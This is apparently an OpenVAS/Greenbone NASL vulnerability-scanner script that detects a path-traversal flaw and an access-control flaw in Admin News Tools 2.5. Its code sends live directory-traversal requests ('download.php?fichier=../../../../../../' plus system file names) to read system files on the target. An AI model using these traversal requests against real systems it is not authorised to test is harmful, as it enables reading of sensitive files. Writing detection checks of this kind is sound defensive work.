# SPDX-FileCopyrightText: 2009 Greenbone AG
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-only

CPE = "cpe:/a:adminnewstools:admin_news_tools";

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.900905");
  script_version("2025-04-15T05:54:49+0000");
  script_tag(name:"last_modification", value:"2025-04-15 05:54:49 +0000 (Tue, 15 Apr 2025)");
  script_tag(name:"creation_date", value:"2009-07-31 07:37:13 +0200 (Fri, 31 Jul 2009)");
  script_tag(name:"cvss_base", value:"7.5");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_cve_id("CVE-2009-2557", "CVE-2009-2558");
  script_name("Admin News Tools Multiple Vulnerabilities");
  script_category(ACT_ATTACK);
  script_copyright("Copyright (C) 2009 Greenbone AG");
  script_family("Web application abuses");
  script_dependencies("secpod_admin_news_tools_detect.nasl", "os_detection.nasl");
  script_mandatory_keys("ANT/installed");
  script_require_ports("Services/www", 80);

  script_tag(name:"impact", value:"Successful exploitation will allow remote attackers to bypass security
  restrictions by gaining sensitive information and redirect the user to other malicious sites.");

  script_tag(name:"affected", value:"Admin News Tools version 2.5.");

  script_tag(name:"insight", value:"- Input passed via the 'fichier' parameter in 'system/download.php' is not
  properly verified before being processed and can be used to read arbitrary files via a .. (dot dot) sequence.

  - Access to system/message.php is not restricted properly and can be
  exploited to post news messages by accessing the script directly.");

  script_tag(name:"solution", value:"Upgrade to Admin News Tools version 3.0 or later.");

  script_tag(name:"summary", value:"Admin News Tools is prone to multiple vulnerabilities.");

  script_xref(name:"URL", value:"http://secunia.com/advisories/35842");
  script_xref(name:"URL", value:"http://www.milw0rm.com/exploits/9161");
  script_xref(name:"URL", value:"http://www.milw0rm.com/exploits/9153");
  script_xref(name:"URL", value:"http://xforce.iss.net/xforce/xfdb/51780");

  script_tag(name:"qod_type", value:"remote_app");
  script_tag(name:"solution_type", value:"VendorFix");

  exit(0);
}

include("misc_func.inc");
include("traversal_func.inc");
include("http_func.inc");
include("http_keepalive.inc");
include("host_details.inc");
include("os_func.inc");

if( ! port = get_app_port( cpe:CPE ) )
  exit( 0 );

if( ! dir = get_app_location( cpe:CPE, port:port ) )
  exit( 0 );

if( dir == "/" )
  dir = "";

if( os_host_runs("windows") == "yes" ) {
  files = traversal_files( "windows" );
  foreach file( keys( files ) ) {
    url = dir + "/news/system/download.php?fichier=./../../../../../" + files[file];
    if( http_vuln_check( port:port, url:url, pattern:file ) ) {
      report = http_report_vuln_url( port:port, url:url );
      security_message( port:port, data:report );
      exit( 0 );
    }
  }
} else {
  files = traversal_files( "linux" );
  foreach file( keys( files ) ) {
    url = dir + "/news/system/download.php?fichier=../../../../../../" + files[file];
    if( http_vuln_check( port:port, url:url, pattern:file ) ) {
      report = http_report_vuln_url( port:port, url:url );
      security_message( port:port, data:report );
      exit( 0 );
    }
  }
}

exit( 99 );
